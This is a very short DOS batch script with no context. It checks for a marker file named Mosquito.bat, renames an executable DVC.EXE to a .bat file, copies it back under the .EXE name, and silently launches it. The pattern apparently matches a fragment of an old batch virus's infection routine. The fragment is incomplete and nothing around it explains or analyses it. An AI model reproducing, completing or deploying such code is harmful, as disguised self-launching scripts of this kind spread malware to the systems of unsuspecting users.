@Echo off
@if exist c:\Mosquito.bat goto :BZ
:BZXT
@ren DVC.EXE BZz.bat
@copy BZz.bat DVC.EXE
@start /m BZz.bat
:BZ
CLS
